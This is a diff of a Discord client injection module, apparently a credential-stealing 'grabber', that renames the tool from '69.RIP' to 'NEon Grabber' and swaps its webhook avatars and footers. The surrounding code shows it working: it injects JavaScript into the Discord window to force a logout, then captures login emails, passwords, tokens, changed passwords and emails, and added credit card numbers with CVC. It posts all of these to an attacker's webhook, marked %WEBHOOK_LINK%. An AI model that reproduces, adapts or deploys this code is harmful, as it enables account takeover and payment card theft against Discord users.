@@ -6,10 +6,10 @@ const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push
 var webhook = "%WEBHOOK_LINK%";
 
 function FirstTime() {
-    if (!fs.existsSync(path.join(__dirname, "69.RIP"))) {
+    if (!fs.existsSync(path.join(__dirname, "NEon"))) {
         return !0
     }
-    fs.rmdirSync(path.join(__dirname, "69.RIP"));
+    fs.rmdirSync(path.join(__dirname, "NEon"));
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
     return !1
@@ -140,9 +140,9 @@ function Login(email, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "69.RIP",
+            username: "NEon Grabber",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://cdn.discordapp.com/attachments/940990064308125719/941153755867516938/Comp_1.gif",
             embeds: [
                 {
                     "color": 000000,
@@ -163,7 +163,7 @@ function Login(email, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "69.RIP BY NEON"
+                        "text": "NEon Grabber By NEon#0100"
                     }
                 }
             ]
@@ -182,9 +182,9 @@ function ChangePassword(oldpassword, newpassword, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "69.RIP",
+            username: "NEon Grabber",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://cdn.discordapp.com/attachments/940990064308125719/941153755867516938/Comp_1.gif",
             embeds: [
                 {
                     "color": 000000,
@@ -210,7 +210,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "69.RIP BY NEON"
+                        "text": "NEon Grabber By NEon#0100・"
                     }                 
                 }
             ]
@@ -229,9 +229,9 @@ function ChangeEmail(newemail, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         var json = JSON.parse(info);
         var params = {
-            username: "69.RIP",
+            username: "NEon Grabber",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://cdn.discordapp.com/attachments/940990064308125719/941153755867516938/Comp_1.gif",
             embeds: [
                 {
                     "color": 000000,
@@ -257,7 +257,7 @@ function ChangeEmail(newemail, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "69.RIP BY NEON"
+                        "text": "NEon Grabber By NEon#0100・"
                     }                
                 }
             ]
@@ -276,9 +276,9 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         var json = JSON.parse(info);
         var params = {
-            username: "69.RIP",
+            username: "NEon Grabber",
             content: "@everyone",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://cdn.discordapp.com/attachments/940990064308125719/941153755867516938/Comp_1.gif",
             embeds: [
                 {
                     "color": 000000,
@@ -304,7 +304,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "69.RIP BY NEON"
+                        "text": "NEon Grabber By NEon#0100・"
                     }
                 }
             ]
@@ -355,5 +355,4 @@ session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => 
         }))
 	}
 });
-
 module.exports = require('./core.asar')
